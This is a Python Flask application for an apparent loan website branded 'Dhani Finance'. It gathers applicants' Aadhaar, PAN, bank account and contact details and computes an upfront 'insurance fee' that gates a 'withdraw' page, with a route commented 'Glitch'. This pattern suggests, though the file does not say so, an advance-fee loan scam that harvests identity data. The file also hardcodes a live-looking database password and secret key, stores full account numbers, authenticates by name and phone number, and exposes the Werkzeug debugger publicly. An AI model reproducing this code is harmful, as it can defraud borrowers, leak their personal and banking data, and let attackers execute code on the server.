from urllib.parse import quote_plus
from flask import Flask, render_template, request, redirect, url_for, flash, session
from pymongo import MongoClient
import datetime

app = Flask(__name__)
app.secret_key = 'supersecret'



# MongoDB Atlas connection
username = quote_plus("dhani_admin")
password = quote_plus("Anascool@2001")
uri = f"mongodb+srv://{username}:{password}@finance.1osnvho.mongodb.net/?retryWrites=true&w=majority&tls=true&appName=Finance"
client = MongoClient(uri)
db = client["Dhani_Finance"]
collection = db["loan_applications"]

# Helper functions
def mask_aadhaar(aadhaar):
    return "XXXX-XXXX-" + aadhaar[-4:] if aadhaar else "XXXX-XXXX-0000"

def mask_pan(pan):
    return "XXXXX" + pan[-5:] if pan else "XXXXX0000"

# Home Page
@app.route('/')
def home():
    return render_template("index.html")

def calculate_emi(principal, annual_rate, years):
    rate = (annual_rate / 12) / 100
    months = years * 12
    emi = (principal * rate * ((1 + rate) ** months)) / (((1 + rate) ** months) - 1)
    return round(emi)

def calculate_insurance_fee(loan_amount):
    base_fee = 3250
    if loan_amount <= 100000:
        return base_fee
    else:
        extra_amount = loan_amount - 100000
        additional_fee = extra_amount * 0.02  # 2% on amount above ₹1L
        return round(base_fee + additional_fee, 2)

# Apply Loan Page
@app.route('/apply', methods=['GET', 'POST'])
def apply():
    if request.method == 'POST':
        try:
            name = request.form['name']
            mobile = request.form['mobile']
            email = request.form['email']
            loan_amount = float(request.form['loan_amount'])  # convert to float
            aadhaar = request.form['aadhaar']
            pan = request.form['pan']
            bank_account = request.form['bank_account']
            ifsc = request.form['ifsc']
            emi_tenure = int(request.form['emi_tenure'])  # in years

            # --- Calculate EMI ---
            def calculate_emi(principal, annual_rate, years):
                rate = (annual_rate / 12) / 100
                months = years * 12
                emi = (principal * rate * ((1 + rate) ** months)) / (((1 + rate) ** months) - 1)
                return round(emi)

            annual_interest_rate = 5.99  # can be dynamic later
            emi_amount = calculate_emi(loan_amount, annual_interest_rate, emi_tenure)

            # --- Calculate Insurance Fee ---
            insurance_fee = calculate_insurance_fee(loan_amount)

            masked_aadhaar = mask_aadhaar(aadhaar)
            masked_pan = mask_pan(pan)

            application = {
                "name": name,
                "mobile": mobile,
                "email": email,
                "loan_amount": loan_amount,
                "insurance_fee": insurance_fee,
                "aadhaar": masked_aadhaar,
                "pan": masked_pan,
                "bank_account": bank_account,
                "ifsc": ifsc,
                "emi_tenure": emi_tenure,
                "emi_amount": emi_amount,
                "submitted_at": datetime.datetime.now()
            }

            collection.insert_one(application)
            session['user_email'] = email

            return redirect(url_for('profile'))

        except Exception as e:
            flash(f"❌ Error: {str(e)}", "danger")
            return redirect(url_for('apply'))

    return render_template("apply.html")




# Loan Category Pages
@app.route('/loan/car')
def loan_car():
    latest = collection.find().sort("submitted_at", -1).limit(1)
    return render_template('loan_car.html', recent=latest)

@app.route('/loan/home')
def loan_home():
    latest = collection.find().sort("submitted_at", -1).limit(1)
    return render_template('loan_home.html', recent=latest)

@app.route('/loan/personal')
def loan_personal():
    latest = collection.find().sort("submitted_at", -1).limit(1)
    return render_template('loan_personal.html', recent=latest)

@app.route('/loan')
def loan():
    return render_template("loan.html")

@app.route('/about')
def about():
    return render_template("about.html")

# Next Page (Glitch + Profile + Withdraw)
@app.route('/next')
def next_page():
    user_email = session.get('user_email')

    if not user_email:
        flash("Please submit an application first.", "warning")
        return redirect(url_for('apply'))

    user = collection.find_one({'email': user_email})

    user_data = {
        'user_name': user.get('name', 'John D.'),
        'aadhaar': user.get('aadhaar', 'XXXX-XXXX-1234'),
        'bank_account': 'XXXXXX' + user.get('bank_account', '')[-4:],
        'mobile': '*****' + user.get('mobile', '')[-4:]
    } if user else {
        'user_name': 'John D.',
        'aadhaar': 'XXXX-XXXX-1234',
        'bank_account': 'XXXXXX0000',
        'mobile': '*****0000'
    }

    return render_template("next.html", user_data=user_data)


# Withdraw Page 
@app.route('/withdraw')
def withdraw():
    user_email = session.get('user_email')

    if user_email:
        user = collection.find_one({"email": user_email}, sort=[("submitted_at", -1)])
        if user:
            name = user.get('name', 'Customer')

            # ✅ Ensure values are numeric (convert from str if needed)
            try:
                loan_amount = float(user.get('loan_amount', 100000))
            except (ValueError, TypeError):
                loan_amount = 100000.0

            try:
                emi_amount = float(user.get('emi_amount', 4250))
            except (ValueError, TypeError):
                emi_amount = 4250.0

            try:
                duration = int(user.get('emi_tenure', 2))  # assuming correct field is 'emi_tenure'
            except (ValueError, TypeError):
                duration = 2

            return render_template('withdraw.html',
                                   user_name=name,
                                   masked_aadhaar=user.get('aadhaar', 'XXXX-XXXX-1234'),
                                   masked_account='XXXXXX' + user.get('bank_account', '')[-4:],
                                   masked_mobile='*****' + user.get('mobile', '')[-4:],
                                   loan_amount=loan_amount,
                                   emi_amount=emi_amount,
                                   duration=duration)
        else:
            flash("User data not found.", "danger")
            return redirect(url_for('apply'))

    flash("Please submit an application first.", "warning")
    return redirect(url_for('apply'))



# Profile Page (Shows submitted user details)
@app.route('/profile')
def profile():
    
    user_email = session.get('user_email')

    if not user_email:
        flash("Please submit your loan application first.", "warning")
        return redirect(url_for('apply'))

    user = collection.find_one({'email': user_email})

    if not user:
        flash("User data not found.", "danger")
        return redirect(url_for('apply'))

    # ✅ EMI and interest calculation
    try:
        loan_amount = float(user.get('loan_amount', 0))
        emi_months = int(user.get('emi_tenure', 0))  # make sure this field is saved
        annual_interest = 5.99  # percent

        monthly_interest = annual_interest / (12 * 100)

        if emi_months > 0:
            emi = (loan_amount * monthly_interest * pow(1 + monthly_interest, emi_months)) / \
                  (pow(1 + monthly_interest, emi_months) - 1)
            total_payment = emi * emi_months
            total_interest = total_payment - loan_amount
        else:
            emi = total_payment = total_interest = 0

        user['monthly_emi'] = round(emi, 2)
        user['total_payment'] = round(total_payment, 2)
        user['total_interest'] = round(total_interest, 2)
    except Exception as e:
        print("EMI calculation error:", e)
        user['monthly_emi'] = user['total_payment'] = user['total_interest'] = 0
        
    return render_template('profile.html', user=user)



# Customer Care Page
@app.route('/customer-care')
def customer_care():
    return render_template('customer_care_page.html')


# User Login Page using existing loan_applications data
@app.route('/userlogin', methods=['GET', 'POST'])
def user_login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']  # Mobile number

        user = collection.find_one({'name': username, 'mobile': password})

        if user:
            session['logged_user_name'] = user['name']
            session['logged_user_mobile'] = user['mobile']
            flash("✅ Login successful!", "success")
            return redirect(url_for('user_dashboard'))
        else:
            flash("❌ Invalid name or mobile number.", "danger")
            return redirect(url_for('user_login'))

    return render_template('user_login.html')


@app.route('/user-dashboard')
def user_dashboard():
    if 'logged_user_name' not in session:
        flash("Please login first!", "warning")
        return redirect(url_for('user_login'))

    user = collection.find_one({
        'name': session['logged_user_name'],
        'mobile': session['logged_user_mobile']
    })

    if not user:
        flash("❌ User data not found.", "danger")
        return redirect(url_for('user_login'))

    return render_template('user_dashboard.html', user=user)



# Run the App
if __name__ == '__main__':
    app.run(debug=True)

# Only used if running manually (not with Gunicorn)
if __name__ == '__main__':
    from werkzeug.serving import run_simple
    run_simple('0.0.0.0', 80, app, use_debugger=True, use_reloader=True)

